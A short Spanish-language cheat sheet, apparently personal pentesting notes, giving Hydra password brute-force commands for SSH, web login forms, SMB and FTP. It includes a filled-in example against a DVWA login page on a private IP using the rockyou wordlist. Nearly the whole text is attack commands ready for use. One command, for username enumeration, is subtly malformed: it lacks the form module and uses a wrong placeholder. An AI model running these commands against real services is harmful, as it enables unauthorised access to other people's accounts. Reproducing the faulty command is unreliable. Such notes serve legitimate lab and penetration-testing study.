
Utilizado para bruteforce de SSH teniendo nombre de usuario:
```bash
hydra -l {usuario} -P {diccionario} ssh://{IP}
```

Para website de login ya sabiendo al menos el usuario:
```bash
hydra -l {usuario} -P {diccionario} {IP} http-post-form '{ruta donde esta el login php:username^USER^&password=^PASS^&Login=Login:{msj de error}}'
```
EJEMPLO:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.52 http-post-form '/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed'
```

Podemos hacer lo mismo para hacer bruteforce con nombres de usuario:
``` bash
hydra -L {diccionario} -p test {IP} '{ruta donde esta el login php:log^USER^&pwd=^PWD^:{msj de error}}'
```

ATENCIÓN: log y pwd cambian de nombre según lo que interceptemos con Burpsuite.

ATENCIÓN: usamos -l si vamos a poner un string y -L si vamos a utilizar un diccionario, los mismo con -p y -P

Ataque Hydra para cliente SMB (windows, port 445, sabiendo usuario)
```bash
hydra -l {usuario} -P /usr/share/wordlists/rockyou.txt smb://{IP}
```


Utilizado para bruteforce de FTP teniendo nombre de usuario:
```bash
hydra -l {usuario} -P {diccionario} ftp://{IP}
```

